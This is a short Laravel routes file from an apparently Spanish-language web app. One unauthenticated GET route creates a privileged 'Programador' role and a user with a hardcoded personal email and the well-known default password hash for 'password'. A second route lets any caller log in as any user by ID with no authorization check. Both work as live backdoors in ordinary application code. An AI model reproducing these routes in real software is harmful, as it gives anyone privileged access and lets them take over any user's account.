<?php
use App\Models\User;
use App\Models\Role;
use Illuminate\Support\Facades\Route;



Route::get('crearCuentaDeProgramador', function () {

    if( !Role::firstWhere('name', 'Programador') or !User::firstWhere('email', 'javierjeanpieres@gmail.com'))
    {
        Role::updateOrCreate(['name'=> 'Usuario'],[ 'visibility' => true]);
        Role::updateOrCreate(['name'=> 'Administrador'], ['visibility' => true]);
        Role::updateOrCreate(['name'=> 'Administrador Principal']);
        $programmer = Role::updateOrCreate(['name'=> 'Programador']);

        User::create([
            'name' => 'Jepisan',
            'role_id' => $programmer->id,
            'email' => 'javierjeanpieres@gmail.com',
            'password' => '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi',
        ]);
    }
    return redirect()->route('dashboard');
});

Route::post('impersonate/{id}/start', function ($id) {
    $user = User::find($id);

    Auth::login($user);
    
    return redirect()->back();
})->name('impersonate.start');
Route::post('impersonate/{id}/stop', function ($id) {
    
})->name('impersonate.stop');
